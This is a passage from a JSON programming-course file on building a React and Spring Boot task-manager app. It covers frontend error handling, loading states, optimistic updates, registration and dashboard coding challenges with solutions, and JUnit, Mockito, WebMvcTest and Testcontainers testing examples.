= useCallback(async () => {\n    try {\n      setLoading(true);\n      const data = await taskService.getTasks({ \n        page: pagination.page, \n        ...filters \n      });\n      setTasks(data.content);\n      setPagination(prev => ({\n        ...prev,\n        totalPages: data.totalPages,\n        totalElements: data.totalElements,\n      }));\n      setError(null);\n    } catch (err) {\n      setError('Failed to load tasks');\n      console.error(err);\n    } finally {\n      setLoading(false);\n    }\n  }, [pagination.page, filters]);\n\n  useEffect(() => {\n    loadTasks();\n  }, [loadTasks]);\n\n  async function handleDelete(taskId) {\n    if (!window.confirm('Delete this task?')) return;\n    try {\n      await taskService.deleteTask(taskId);\n      setTasks(prev => prev.filter(t => t.id !== taskId));\n    } catch (err) {\n      setError('Failed to delete task');\n    }\n  }\n\n  async function handleToggleComplete(task) {\n    try {\n      const updated = await taskService.toggleComplete(task.id, task.status);\n      setTasks(prev => prev.map(t => t.id === task.id ? updated : t));\n    } catch (err) {\n      setError('Failed to update task');\n    }\n  }\n\n  return (\n    <div className=\"space-y-6\">\n      <div className=\"flex justify-between items-center\">\n        <h1 className=\"text-2xl font-bold\">My Tasks</h1>\n        <Link\n          to=\"/tasks/new\"\n          className=\"bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700\"\n        >\n          + New Task\n        </Link>\n      </div>\n\n      <TaskFilters filters={filters} onFilterChange={setFilters} />\n\n      {error && (\n        <div className=\"bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded\">\n          {error}\n        </div>\n      )}\n\n      {loading ? (\n        <LoadingSpinner />\n      ) : (\n        <TaskList\n          tasks={tasks}\n          onDelete={handleDelete}\n          onToggleComplete={handleToggleComplete}\n        />\n      )}\n    </div>\n  );\n}\n```\n\nThis pattern keeps components focused on UI while the service handles API communication."
            },
            {
              "type": "THEORY",
              "title": "Handling API Errors in the Frontend",
              "content": "Robust error handling separates professional applications from amateur ones. Users should always understand what went wrong and what they can do about it.\n\nError Response Structure:\nOur Spring Boot backend returns consistent error responses:\n\n```json\n{\n  \"timestamp\": \"2024-01-15T10:30:00Z\",\n  \"status\": 400,\n  \"error\": \"Bad Request\",\n  \"detail\": \"Title is required\",\n  \"path\": \"/api/tasks\",\n  \"errors\": {\n    \"title\": \"Title is required\",\n    \"dueDate\": \"Due date must be in the future\"\n  }\n}\n```\n\nCentralized Error Handling:\n\n```javascript\n// src/utils/errorHandler.js\nexport function getErrorMessage(error) {\n  // Network error (no response from server)\n  if (!error.response) {\n    return 'Unable to connect to server. Please check your internet connection.';\n  }\n\n  const { status, data } = error.response;\n\n  // Handle specific status codes\n  switch (status) {\n    case 400:\n      return data.detail || 'Invalid request. Please check your input.';\n    case 401:\n      return 'Session expired. Please log in again.';\n    case 403:\n      return 'You do not have permission to perform this action.';\n    case 404:\n      return 'The requested resource was not found.';\n    case 409:\n      return data.detail || 'This operation conflicts with existing data.';\n    case 422:\n      return data.detail || 'Validation failed. Please check your input.';\n    case 500:\n      return 'Server error. Please try again later.';\n    default:\n      return data.detail || 'An unexpected error occurred.';\n  }\n}\n\nexport function getFieldErrors(error) {\n  return error.response?.data?.errors || {};\n}\n```\n\nUsing Error Handling in Forms:\n\n```jsx\n// In TaskForm.jsx\nimport { getErrorMessage, getFieldErrors } from '../utils/errorHandler';\n\nasync function handleSubmit(e) {\n  e.preventDefault();\n  setLoading(true);\n  setError(null);\n  setFieldErrors({});\n\n  try {\n    if (isEditMode) {\n      await taskService.updateTask(id, formData);\n    } else {\n      await taskService.createTask(formData);\n    }\n    navigate('/tasks');\n  } catch (err) {\n    // Set general error message\n    setError(getErrorMessage(err));\n    \n    // Set field-specific errors for inline display\n    setFieldErrors(getFieldErrors(err));\n  } finally {\n    setLoading(false);\n  }\n}\n\n// Render field errors inline\n<input\n  name=\"title\"\n  className={fieldErrors.title ? 'border-red-500' : 'border-gray-300'}\n  // ...\n/>\n{fieldErrors.title && (\n  <p className=\"text-red-500 text-sm mt-1\">{fieldErrors.title}</p>\n)}\n```\n\nGlobal Error Boundary:\n\n```jsx\n// src/components/common/ErrorBoundary.jsx\nimport { Component } from 'react';\n\nexport default class ErrorBoundary extends Component {\n  state = { hasError: false, error: null };\n\n  static getDerivedStateFromError(error) {\n    return { hasError: true, error };\n  }\n\n  componentDidCatch(error, errorInfo) {\n    console.error('Error caught by boundary:', error, errorInfo);\n    // Send to error tracking service (Sentry, etc.)\n  }\n\n  render() {\n    if (this.state.hasError) {\n      return (\n        <div className=\"min-h-screen flex items-center justify-center\">\n          <div className=\"text-center\">\n            <h1 className=\"text-2xl font-bold text-red-600 mb-4\">\n              Something went wrong\n            </h1>\n            <p className=\"text-gray-600 mb-4\">\n              We are sorry, but something unexpected happened.\n            </p>\n            <button\n              onClick={() => window.location.reload()}\n              className=\"bg-blue-600 text-white px-4 py-2 rounded\"\n            >\n              Reload Page\n            </button>\n          </div>\n        </div>\n      );\n    }\n    return this.props.children;\n  }\n}\n```"
            },
            {
              "type": "THEORY",
              "title": "Loading States and Optimistic Updates",
              "content": "A responsive UI requires proper loading states and, for better user experience, optimistic updates that show changes immediately before server confirmation.\n\nLoading States:\n\n```jsx\n// src/components/common/LoadingSpinner.jsx\nexport default function LoadingSpinner({ size = 'medium', className = '' }) {\n  const sizeClasses = {\n    small: 'w-4 h-4',\n    medium: 'w-8 h-8',\n    large: 'w-12 h-12',\n  };\n\n  return (\n    <div className={`flex justify-center items-center ${className}`}>\n      <div\n        className={`${sizeClasses[size]} border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin`}\n      />\n    </div>\n  );\n}\n\n// Button with loading state\nexport function LoadingButton({ loading, children, ...props }) {\n  return (\n    <button disabled={loading} {...props}>\n      {loading ? (\n        <span className=\"flex items-center gap-2\">\n          <LoadingSpinner size=\"small\" />\n          Processing...\n        </span>\n      ) : (\n        children\n      )}\n    </button>\n  );\n}\n```\n\nSkeleton Loading for Lists:\n\n```jsx\n// src/components/common/TaskSkeleton.jsx\nexport default function TaskSkeleton() {\n  return (\n    <div className=\"border rounded-lg p-4 animate-pulse\">\n      <div className=\"h-4 bg-gray-200 rounded w-3/4 mb-2\" />\n      <div className=\"h-3 bg-gray-200 rounded w-1/2 mb-4\" />\n      <div className=\"flex justify-between\">\n        <div className=\"h-3 bg-gray-200 rounded w-1/4\" />\n        <div className=\"h-3 bg-gray-200 rounded w-1/6\" />\n      </div>\n    </div>\n  );\n}\n\n// Usage\n{loading ? (\n  <div className=\"grid gap-4\">\n    {[1, 2, 3].map(i => <TaskSkeleton key={i} />)}\n  </div>\n) : (\n  <TaskList tasks={tasks} />\n)}\n```\n\nOptimistic Updates:\nOptimistic updates immediately reflect user actions in the UI, then sync with the server. If the server request fails, we roll back.\n\n```jsx\nasync function handleToggleComplete(task) {\n  // Optimistically update UI immediately\n  const previousTasks = tasks;\n  const optimisticStatus = task.status === 'COMPLETED' ? 'PENDING' : 'COMPLETED';\n  \n  setTasks(prev => prev.map(t => \n    t.id === task.id ? { ...t, status: optimisticStatus } : t\n  ));\n\n  try {\n    // Actually update on server\n    await taskService.toggleComplete(task.id, task.status);\n  } catch (err) {\n    // Rollback on failure\n    setTasks(previousTasks);\n    setError('Failed to update task status');\n  }\n}\n\nasync function handleDelete(taskId) {\n  if (!window.confirm('Delete this task?')) return;\n\n  // Optimistically remove from UI\n  const previousTasks = tasks;\n  setTasks(prev => prev.filter(t => t.id !== taskId));\n\n  try {\n    await taskService.deleteTask(taskId);\n    // Success - no action needed, UI already updated\n  } catch (err) {\n    // Rollback on failure\n    setTasks(previousTasks);\n    setError('Failed to delete task');\n  }\n}\n```\n\nOptimistic updates make your application feel instant. The key is always saving the previous state so you can rollback on error. This pattern is especially effective for toggle operations and deletions where the user expects immediate feedback."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "capstone-16-7-register-page",
              "title": "Build the Registration Page",
              "description": "Create a complete RegisterPage component with form validation, error handling, and redirect after successful registration.",
              "instructions": "Create a RegisterPage component that:\n1. Has fields for name, email, password, and confirm password\n2. Validates that passwords match before submitting\n3. Shows field-specific errors from the server\n4. Redirects to dashboard after successful registration\n5. Has a link to the login page",
              "starterCode": "// src/pages/RegisterPage.jsx\nimport { useState } from 'react';\nimport { useNavigate, Link } from 'react-router-dom';\nimport { useAuth } from '../hooks/useAuth';\n\nexport default function RegisterPage() {\n  // TODO: Implement the registration page\n}",
              "solution": "// src/pages/RegisterPage.jsx\nimport { useState } from 'react';\nimport { useNavigate, Link } from 'react-router-dom';\nimport { useAuth } from '../hooks/useAuth';\nimport { getErrorMessage, getFieldErrors } from '../utils/errorHandler';\n\nexport default function RegisterPage() {\n  const [formData, setFormData] = useState({\n    name: '',\n    email: '',\n    password: '',\n    confirmPassword: '',\n  });\n  const [error, setError] = useState('');\n  const [fieldErrors, setFieldErrors] = useState({});\n  const [loading, setLoading] = useState(false);\n  \n  const { register } = useAuth();\n  const navigate = useNavigate();\n\n  function handleChange(e) {\n    const { name, value } = e.target;\n    setFormData(prev => ({ ...prev, [name]: value }));\n    if (fieldErrors[name]) {\n      setFieldErrors(prev => ({ ...prev, [name]: null }));\n    }\n  }\n\n  function validate() {\n    const errors = {};\n    if (!formData.name.trim()) {\n      errors.name = 'Name is required';\n    }\n    if (!formData.email.trim()) {\n      errors.email = 'Email is required';\n    } else if (!/\\S+@\\S+\\.\\S+/.test(formData.email)) {\n      errors.email = 'Invalid email format';\n    }\n    if (!formData.password) {\n      errors.password = 'Password is required';\n    } else if (formData.password.length < 8) {\n      errors.password = 'Password must be at least 8 characters';\n    }\n    if (formData.password !== formData.confirmPassword) {\n      errors.confirmPassword = 'Passwords do not match';\n    }\n    setFieldErrors(errors);\n    return Object.keys(errors).length === 0;\n  }\n\n  async function handleSubmit(e) {\n    e.preventDefault();\n    if (!validate()) return;\n\n    setError('');\n    setLoading(true);\n\n    try {\n      await register(formData.email, formData.password, formData.name);\n      navigate('/dashboard', { replace: true });\n    } catch (err) {\n      setError(getErrorMessage(err));\n      setFieldErrors(getFieldErrors(err));\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  return (\n    <div className=\"min-h-screen flex items-center justify-center bg-gray-100\">\n      <div className=\"bg-white p-8 rounded-lg shadow-md w-full max-w-md\">\n        <h1 className=\"text-2xl font-bold text-center mb-6\">Create Account</h1>\n        \n        {error && (\n          <div className=\"bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4\">\n            {error}\n          </div>\n        )}\n\n        <form onSubmit={handleSubmit} className=\"space-y-4\">\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">Name</label>\n            <input\n              type=\"text\"\n              name=\"name\"\n              value={formData.name}\n              onChange={handleChange}\n              className={`w-full border rounded-md px-3 py-2 ${fieldErrors.name ? 'border-red-500' : 'border-gray-300'}`}\n              placeholder=\"Your name\"\n            />\n            {fieldErrors.name && <p className=\"text-red-500 text-sm mt-1\">{fieldErrors.name}</p>}\n          </div>\n\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">Email</label>\n            <input\n              type=\"email\"\n              name=\"email\"\n              value={formData.email}\n              onChange={handleChange}\n              className={`w-full border rounded-md px-3 py-2 ${fieldErrors.email ? 'border-red-500' : 'border-gray-300'}`}\n              placeholder=\"you@example.com\"\n            />\n            {fieldErrors.email && <p className=\"text-red-500 text-sm mt-1\">{fieldErrors.email}</p>}\n          </div>\n\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">Password</label>\n            <input\n              type=\"password\"\n              name=\"password\"\n              value={formData.password}\n              onChange={handleChange}\n              className={`w-full border rounded-md px-3 py-2 ${fieldErrors.password ? 'border-red-500' : 'border-gray-300'}`}\n              placeholder=\"At least 8 characters\"\n            />\n            {fieldErrors.password && <p className=\"text-red-500 text-sm mt-1\">{fieldErrors.password}</p>}\n          </div>\n\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">Confirm Password</label>\n            <input\n              type=\"password\"\n              name=\"confirmPassword\"\n              value={formData.confirmPassword}\n              onChange={handleChange}\n              className={`w-full border rounded-md px-3 py-2 ${fieldErrors.confirmPassword ? 'border-red-500' : 'border-gray-300'}`}\n              placeholder=\"Confirm your password\"\n            />\n            {fieldErrors.confirmPassword && <p className=\"text-red-500 text-sm mt-1\">{fieldErrors.confirmPassword}</p>}\n          </div>\n\n          <button\n            type=\"submit\"\n            disabled={loading}\n            className=\"w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 disabled:opacity-50\"\n          >\n            {loading ? 'Creating Account...' : 'Create Account'}\n          </button>\n        </form>\n\n        <p className=\"text-center mt-4 text-gray-600\">\n          Already have an account?{' '}\n          <Link to=\"/login\" className=\"text-blue-600 hover:underline\">Sign In</Link>\n        </p>\n      </div>\n    </div>\n  );\n}",
              "language": "jsx",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Use useState to manage form fields. Create a handleChange function that updates formData based on input name."
                },
                {
                  "level": 2,
                  "text": "Create a validate() function that checks all fields and sets fieldErrors. Return true only if no errors."
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "capstone-16-7-dashboard",
              "title": "Build the Dashboard Page",
              "description": "Create a DashboardPage that shows task statistics and recent tasks.",
              "instructions": "Create a DashboardPage component that:\n1. Fetches task statistics (total, pending, completed, overdue counts)\n2. Shows recent 5 tasks\n3. Displays a welcome message with the user's name\n4. Has quick links to create a new task and view all tasks",
              "starterCode": "// src/pages/DashboardPage.jsx\nimport { useState, useEffect } from 'react';\nimport { Link } from 'react-router-dom';\nimport { useAuth } from '../hooks/useAuth';\nimport { taskService } from '../services/taskService';\n\nexport default function DashboardPage() {\n  // TODO: Implement the dashboard\n}",
              "solution": "// src/pages/DashboardPage.jsx\nimport { useState, useEffect } from 'react';\nimport { Link } from 'react-router-dom';\nimport { useAuth } from '../hooks/useAuth';\nimport { taskService } from '../services/taskService';\nimport LoadingSpinner from '../components/common/LoadingSpinner';\nimport TaskCard from '../components/tasks/TaskCard';\n\nexport default function DashboardPage() {\n  const { user } = useAuth();\n  const [stats, setStats] = useState({ total: 0, pending: 0, completed: 0, overdue: 0 });\n  const [recentTasks, setRecentTasks] = useState([]);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    async function loadDashboard() {\n      try {\n        setLoading(true);\n        const tasksResponse = await taskService.getTasks({ size: 100 });\n        const tasks = tasksResponse.content;\n\n        const now = new Date();\n        const statistics = {\n          total: tasks.length,\n          pending: tasks.filter(t => t.status === 'PENDING').length,\n          completed: tasks.filter(t => t.status === 'COMPLETED').length,\n          overdue: tasks.filter(t => \n            t.dueDate && \n            new Date(t.dueDate) < now && \n            t.status !== 'COMPLETED'\n          ).length,\n        };\n        setStats(statistics);\n\n        const sorted = [...tasks].sort((a, b) => \n          new Date(b.createdAt) - new Date(a.createdAt)\n        );\n        setRecentTasks(sorted.slice(0, 5));\n        setError(null);\n      } catch (err) {\n        setError('Failed to load dashboard');\n        console.error(err);\n      } finally {\n        setLoading(false);\n      }\n    }\n    loadDashboard();\n  }, []);\n\n  if (loading) return <LoadingSpinner size=\"large\" className=\"py-12\" />;\n\n  return (\n    <div className=\"space-y-8\">\n      <div>\n        <h1 className=\"text-3xl font-bold\">Welcome back, {user?.name || 'User'}!</h1>\n        <p className=\"text-gray-600 mt-1\">Here is an overview of your tasks</p>\n      </div>\n\n      {error && (\n        <div className=\"bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded\">\n          {error}\n        </div>\n      )}\n\n      <div className=\"grid grid-cols-2 md:grid-cols-4 gap-4\">\n        <div className=\"bg-white p-6 rounded-lg shadow\">\n          <p className=\"text-gray-500 text-sm\">Total Tasks</p>\n          <p className=\"text-3xl font-bold\">{stats.total}</p>\n        </div>\n        <div className=\"bg-white p-6 rounded-lg shadow\">\n          <p className=\"text-gray-500 text-sm\">Pending</p>\n          <p className=\"text-3xl font-bold text-yellow-600\">{stats.pending}</p>\n        </div>\n        <div className=\"bg-white p-6 rounded-lg shadow\">\n          <p className=\"text-gray-500 text-sm\">Completed</p>\n          <p className=\"text-3xl font-bold text-green-600\">{stats.completed}</p>\n        </div>\n        <div className=\"bg-white p-6 rounded-lg shadow\">\n          <p className=\"text-gray-500 text-sm\">Overdue</p>\n          <p className=\"text-3xl font-bold text-red-600\">{stats.overdue}</p>\n        </div>\n      </div>\n\n      <div className=\"flex gap-4\">\n        <Link\n          to=\"/tasks/new\"\n          className=\"bg-blue-600 text-white px-6 py-3 rounded-md hover:bg-blue-700\"\n        >\n          + Create New Task\n        </Link>\n        <Link\n          to=\"/tasks\"\n          className=\"bg-gray-200 text-gray-700 px-6 py-3 rounded-md hover:bg-gray-300\"\n        >\n          View All Tasks\n        </Link>\n      </div>\n\n      <div>\n        <h2 className=\"text-xl font-semibold mb-4\">Recent Tasks</h2>\n        {recentTasks.length === 0 ? (\n          <p className=\"text-gray-500\">No tasks yet. Create your first task!</p>\n        ) : (\n          <div className=\"grid gap-4\">\n            {recentTasks.map(task => (\n              <TaskCard \n                key={task.id} \n                task={task} \n                onEdit={() => {}}\n                onDelete={() => {}}\n              />\n            ))}\n          </div>\n        )}\n      </div>\n    </div>\n  );\n}",
              "language": "jsx",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Fetch all tasks in useEffect, then calculate statistics client-side by filtering the array."
                },
                {
                  "level": 2,
                  "text": "For overdue tasks, compare new Date(task.dueDate) < new Date() and ensure task.status !== 'COMPLETED'."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "capstone-lesson-8",
          "title": "Lesson 16.8: Testing the Application",
          "moduleId": "module-16",
          "order": 8,
          "estimatedMinutes": 75,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Unit Tests for Services with JUnit 5 and Mockito",
              "content": "Testing is essential for maintaining code quality and preventing regressions. We will start with unit tests for our service layer, where the business logic lives.\n\nUnit tests verify individual components in isolation. For services, we mock their dependencies (repositories, other services) to focus on testing the service logic itself.\n\nTest Dependencies (already in build.gradle):\n```gradle\ntestImplementation 'org.springframework.boot:spring-boot-starter-test'\n// Includes: JUnit 5, Mockito, AssertJ, Hamcrest\n```\n\nTesting TaskService:\n\n```java\n// src/test/java/com/taskmanager/service/TaskServiceTest.java\npackage com.taskmanager.service;\n\nimport com.taskmanager.dto.TaskRequest;\nimport com.taskmanager.dto.TaskResponse;\nimport com.taskmanager.entity.Task;\nimport com.taskmanager.entity.User;\nimport com.taskmanager.entity.Category;\nimport com.taskmanager.entity.TaskStatus;\nimport com.taskmanager.entity.TaskPriority;\nimport com.taskmanager.exception.ResourceNotFoundException;\nimport com.taskmanager.exception.UnauthorizedException;\nimport com.taskmanager.repository.TaskRepository;\nimport com.taskmanager.repository.CategoryRepository;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.extension.ExtendWith;\nimport org.mockito.InjectMocks;\nimport org.mockito.Mock;\nimport org.mockito.junit.jupiter.MockitoExtension;\n\nimport java.time.LocalDate;\nimport java.util.Optional;\n\nimport static org.assertj.core.api.Assertions.*;\nimport static org.mockito.ArgumentMatchers.any;\nimport static org.mockito.Mockito.*;\n\n@ExtendWith(MockitoExtension.class)\nclass TaskServiceTest {\n\n    @Mock\n    private TaskRepository taskRepository;\n\n    @Mock\n    private CategoryRepository categoryRepository;\n\n    @InjectMocks\n    private TaskService taskService;\n\n    private User testUser;\n    private Task testTask;\n    private TaskRequest validRequest;\n\n    @BeforeEach\n    void setUp() {\n        testUser = new User();\n        testUser.setId(1L);\n        testUser.setEmail(\"test@example.com\");\n        testUser.setName(\"Test User\");\n\n        testTask = new Task();\n        testTask.setId(1L);\n        testTask.setTitle(\"Test Task\");\n        testTask.setStatus(TaskStatus.PENDING);\n        testTask.setPriority(TaskPriority.MEDIUM);\n        testTask.setUser(testUser);\n\n        validRequest = new TaskRequest();\n        validRequest.setTitle(\"New Task\");\n        validRequest.setDescription(\"Task description\");\n        validRequest.setStatus(TaskStatus.PENDING);\n        validRequest.setPriority(TaskPriority.HIGH);\n        validRequest.setDueDate(LocalDate.now().plusDays(7));\n    }\n\n    @Test\n    @DisplayName(\"createTask should save and return task\")\n    void createTask_Success() {\n        // Arrange\n        when(taskRepository.save(any(Task.class))).thenAnswer(invocation -> {\n            Task saved = invocation.getArgument(0);\n            saved.setId(1L);\n            return saved;\n        });\n\n        // Act\n        TaskResponse response = taskService.createTask(validRequest, testUser);\n\n        // Assert\n        assertThat(response).isNotNull();\n        assertThat(response.getTitle()).isEqualTo(\"New Task\");\n        assertThat(response.getPriority()).isEqualTo(TaskPriority.HIGH);\n        verify(taskRepository, times(1)).save(any(Task.class));\n    }\n\n    @Test\n    @DisplayName(\"getTask should throw exception when task not found\")\n    void getTask_NotFound_ThrowsException() {\n        // Arrange\n        when(taskRepository.findById(999L)).thenReturn(Optional.empty());\n\n        // Act & Assert\n        assertThatThrownBy(() -> taskService.getTask(999L, testUser))\n            .isInstanceOf(ResourceNotFoundException.class)\n            .hasMessageContaining(\"Task not found\");\n    }\n\n    @Test\n    @DisplayName(\"getTask should throw exception when user is not owner\")\n    void getTask_WrongUser_ThrowsUnauthorized() {\n        // Arrange\n        User otherUser = new User();\n        otherUser.setId(2L);\n        when(taskRepository.findById(1L)).thenReturn(Optional.of(testTask));\n\n        // Act & Assert\n        assertThatThrownBy(() -> taskService.getTask(1L, otherUser))\n            .isInstanceOf(UnauthorizedException.class);\n    }\n\n    @Test\n    @DisplayName(\"updateTask should update all fields\")\n    void updateTask_Success() {\n        // Arrange\n        when(taskRepository.findById(1L)).thenReturn(Optional.of(testTask));\n        when(taskRepository.save(any(Task.class))).thenAnswer(i -> i.getArgument(0));\n\n        TaskRequest updateRequest = new TaskRequest();\n        updateRequest.setTitle(\"Updated Title\");\n        updateRequest.setStatus(TaskStatus.COMPLETED);\n        updateRequest.setPriority(TaskPriority.LOW);\n\n        // Act\n        TaskResponse response = taskService.updateTask(1L, updateRequest, testUser);\n\n        // Assert\n        assertThat(response.getTitle()).isEqualTo(\"Updated Title\");\n        assertThat(response.getStatus()).isEqualTo(TaskStatus.COMPLETED);\n    }\n\n    @Test\n    @DisplayName(\"deleteTask should remove task\")\n    void deleteTask_Success() {\n        // Arrange\n        when(taskRepository.findById(1L)).thenReturn(Optional.of(testTask));\n        doNothing().when(taskRepository).delete(testTask);\n\n        // Act\n        taskService.deleteTask(1L, testUser);\n\n        // Assert\n        verify(taskRepository, times(1)).delete(testTask);\n    }\n}\n```\n\nRun tests with: ./gradlew test or mvn test\n\nKey testing patterns:\n- @ExtendWith(MockitoExtension.class) enables Mockito annotations\n- @Mock creates mock objects\n- @InjectMocks injects mocks into the service\n- AssertJ provides fluent assertions\n- verify() confirms mock interactions"
            },
            {
              "type": "THEORY",
              "title": "Integration Tests for Controllers with @WebMvcTest",
              "content": "Integration tests verify that components work together correctly. For REST controllers, we use @WebMvcTest which loads only the web layer (controllers, filters, security) without the full application context.\n\n```java\n// src/test/java/com/taskmanager/controller/TaskControllerTest.java\npackage com.taskmanager.controller;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.taskmanager.dto.TaskRequest;\nimport com.taskmanager.dto.TaskResponse;\nimport com.taskmanager.entity.TaskStatus;\nimport com.taskmanager.entity.TaskPriority;\nimport com.taskmanager.security.JwtTokenProvider;\nimport com.taskmanager.service.TaskService;\nimport com.taskmanager.service.CustomUserDetailsService;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;\nimport org.springframework.boot.test.mock.mockito.MockBean;\nimport org.springframework.data.domain.PageImpl;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.http.MediaType;\nimport org.springframework.security.test.context.support.WithMockUser;\nimport org.springframework.test.web.servlet.MockMvc;\n\nimport java.time.LocalDate;\nimport java.util.List;\n\nimport static org.mockito.ArgumentMatchers.any;\nimport static org.mockito.Mockito.when;\nimport static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;\nimport static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.csrf;\n\n@WebMvcTest(TaskController.class)\nclass TaskControllerTest {\n\n    @Autowired\n    private MockMvc mockMvc;\n\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    @MockBean\n    private TaskService taskService;\n\n    @MockBean\n    private JwtTokenProvider jwtTokenProvider;\n\n    @MockBean\n    private CustomUserDetailsService userDetailsService;\n\n    @Test\n    @WithMockUser(username = \"test@example.com\")\n    void getTasks_ReturnsPageOfTasks() throws Exception {\n        // Arrange\n        TaskResponse task = new TaskResponse();\n        task.setId(1L);\n        task.setTitle(\"Test Task\");\n        task.setStatus(TaskStatus.PENDING);\n\n        when(taskService.getTasks(any(), any(Pageable.class)))\n            .thenReturn(new PageImpl<>(List.of(task)));\n\n        // Act & Assert\n        mockMvc.perform(get(\"/api/tasks\")\n                .contentType(MediaType.APPLICATION_JSON))\n            .andExpect(status().isOk())\n            .andExpect(jsonPath(\"$.content[0].id\").value(1))\n            .andExpect(jsonPath(\"$.content[0].title\").value(\"Test Task\"));\n    }\n\n    @Test\n    @WithMockUser(username = \"test@example.com\")\n    void createTask_ValidRequest_Returns201() throws Exception {\n        // Arrange\n        TaskRequest request = new TaskRequest();\n        request.setTitle(\"New Task\");\n        request.setStatus(TaskStatus.PENDING);\n        request.setPriority(TaskPriority.HIGH);\n\n        TaskResponse response = new TaskResponse();\n        response.setId(1L);\n        response.setTitle(\"New Task\");\n\n        when(taskService.createTask(any(TaskRequest.class), any()))\n            .thenReturn(response);\n\n        // Act & Assert\n        mockMvc.perform(post(\"/api/tasks\")\n                .with(csrf())\n                .contentType(MediaType.APPLICATION_JSON)\n                .content(objectMapper.writeValueAsString(request)))\n            .andExpect(status().isCreated())\n            .andExpect(jsonPath(\"$.id\").value(1))\n            .andExpect(jsonPath(\"$.title\").value(\"New Task\"));\n    }\n\n    @Test\n    @WithMockUser(username = \"test@example.com\")\n    void createTask_InvalidRequest_Returns400() throws Exception {\n        // Arrange - empty title\n        TaskRequest request = new TaskRequest();\n        request.setTitle(\"\");\n\n        // Act & Assert\n        mockMvc.perform(post(\"/api/tasks\")\n                .with(csrf())\n                .contentType(MediaType.APPLICATION_JSON)\n                .content(objectMapper.writeValueAsString(request)))\n            .andExpect(status().isBadRequest());\n    }\n\n    @Test\n    void getTasks_Unauthenticated_Returns401() throws Exception {\n        mockMvc.perform(get(\"/api/tasks\"))\n            .andExpect(status().isUnauthorized());\n    }\n\n    @Test\n    @WithMockUser(username = \"test@example.com\")\n    void deleteTask_Returns204() throws Exception {\n        mockMvc.perform(delete(\"/api/tasks/1\")\n                .with(csrf()))\n            .andExpect(status().isNoContent());\n    }\n}\n```\n\nKey @WebMvcTest features:\n- Loads only web layer, not full context (fast)\n- @MockBean creates Spring-managed mocks\n- @WithMockUser simulates authenticated user\n- MockMvc makes HTTP requests and verifies responses\n- csrf() adds CSRF token for POST/PUT/DELETE"
            },
            {
              "type": "THEORY",
              "title": "Testing with Testcontainers for Database Integration",
              "content": "For true integration testing with a real database, Testcontainers spins up Docker containers on demand. This ensures tests run against the same database as production.\n\nAdd Testcontainers Dependency:\n```gradle\ntestImplementation 'org.springframework.boot:spring-boot-testcontainers'\ntestImplementation 'org.testcontainers:junit-jupiter'\ntestImplementation 'org.testcontainers:postgresql'\n```\n\nRepository Integration Tests:\n\n```java\n// src/test/java/com/taskmanager/repository/TaskRepositoryIntegrationTest.java\npackage com.taskmanager.repository;\n\nimport com.taskmanager.entity.*;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.autoconfigure.jdbc.AutoConfigureTestDatabase;\nimport org.springframework.boot.test.autoconfigure.orm.jpa.DataJpaTest;\nimport org.springframework.boot.testcontainers.service.connection.ServiceConnection;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.testcontainers.containers.PostgreSQLContainer;\nimport org.testcontainers.junit.jupiter.Container;\nimport org.testcontainers.junit.jupiter.Testcontainers;\n\nimport java.time.LocalDate;\nimport java.util.List;\n\nimport static org.assertj.core.api.Assertions.assertThat;\n\n@DataJpaTest\n@Testcontainers\n@AutoConfigureTestDatabase(replace = AutoConfigureTestDatabase.Replace.NONE)\nclass TaskRepositoryIntegrationTest {\n\n    @Container\n    @ServiceConnection\n    static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>(\"postgres:15\")\n        .withDatabaseName(\"taskmanager_test\")\n        .withUsername(\"test\")\n        .withPassword(\"test\");\n\n    @Autowired\n    private TaskRepository taskRepository;\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Autowired\n    private CategoryRepository categoryRepository;\n\n    private User testUser;\n    private Category workCategory;\n\n    @BeforeEach\n    void setUp() {\n        taskRepository.deleteAll();\n        categoryRepository.deleteAll();\n        userRepository.deleteAll();\n\n        testUser = new User();\n        testUser.setEmail(\"test@example.com\");\n        testUser.setPassword(\"password\");\n        testUser.setName(\"Test User\");\n        testUser = userRepository.save(testUser);\n\n        workCategory = new Category();\n        workCategory.setName(\"Work\");\n        workCategory.setColor(\"#FF5733\");\n        workCategory.setUser(testUser);\n        workCategory = categoryRepository.save(workCategory);\n    }\n\n    @Test\n    void findByUser_ReturnsOnlyUserTasks() {\n        // Arrange\n        Task task1 = createTask(\"Task 1\", TaskStatus.PENDING);\n        Task task2 = createTask(\"Task 2\", 